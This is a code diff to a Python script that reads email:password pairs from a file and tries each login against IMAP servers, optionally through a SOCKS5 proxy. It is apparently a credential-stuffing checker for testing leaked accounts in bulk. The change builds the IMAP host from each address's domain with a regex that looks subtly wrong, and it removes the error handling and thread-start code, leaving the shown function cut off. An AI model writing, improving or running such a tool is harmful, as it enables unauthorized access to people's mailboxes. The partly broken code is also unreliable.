@@ -5,15 +5,15 @@ import queue
 import time
 import socket
 import socks
-
-# IMAP server details
-imap_server = "imap.example.com"
+import re
 
 # Proxy details (optional)
 use_proxy = False
 proxy_type = socks.SOCKS5
 proxy_addr = "proxy.example.com"
 proxy_port = 1080
+proxy_username =""
+proxy_password =""
 
 # Store the email addresses and passwords in a queue
 credential_queue = queue.Queue()
@@ -23,10 +23,16 @@ with open("list.txt") as credentials:
         credential_queue.put((username, password))
 
 # The function to check an email address
-def check_email(credential_queue, imap_server):
+def check_email(credential_queue):
     while not credential_queue.empty():
         username, password = credential_queue.get()
         print("Checking email:", username)
+
+        # Extract the domain from the email address
+        domain = re.findall(r"@(.+?)\.", username)[0]
+
+        # Build the IMAP server URL
+        imap_server = "imap." + domain
 
         # Connect to the IMAP server
         if use_proxy:
@@ -75,8 +81,3 @@ def check_email(credential_queue, imap_server):
             if duplicates:
                 with open("duplicates.txt", "a") as duplicates_file:
                     for duplicate in duplicates:
-                        duplicates_file.write(duplicate + "\n")
-        except Exception as e:
-            print("Error:", e)
-
-# Start multiple threads to check email
